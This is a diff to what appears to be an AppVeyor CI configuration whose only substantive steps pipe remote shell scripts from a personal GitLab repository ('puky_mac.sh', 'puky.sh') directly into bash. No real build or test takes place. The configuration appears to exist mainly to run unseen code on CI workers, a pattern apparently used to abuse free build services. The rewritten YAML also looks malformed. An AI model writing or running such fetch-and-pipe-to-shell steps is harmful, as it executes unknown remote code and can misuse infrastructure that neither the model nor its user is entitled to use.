@@ -1,40 +1,16 @@
-stack: jdk 15
+version: 1.0.{build}
+image:
+- macOS-BigSur
 
-skip_commits:
-  files:
-    - docs/*
-    - '**/*.md'
+build:
+  parallel: true
+  verbosity: minimal
 
-environment:
-  matrix:
-
-  - job_name: Test1
-    appveyor_build_worker_image: macOS
-  - job_name: Test2
-    appveyor_build_worker_image: Ubuntu
-
-
-matrix:
-  fast_finish: true
-
-init:
-  - appveyor version
-  - echo Some common logic here...
-
-for:
-
-  -
-    matrix:
-      only:
-        - job_name: Test1
-        
-    build_script:
+test:
+  categories:
+  - - Test1
+      build_script:
     - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
-
-  -
-    matrix:
-      only:
-        - job_name: Test2
-
-    build_script:
-    - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky.sh | bash
+  - - Test2
+      build_script:
+    - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
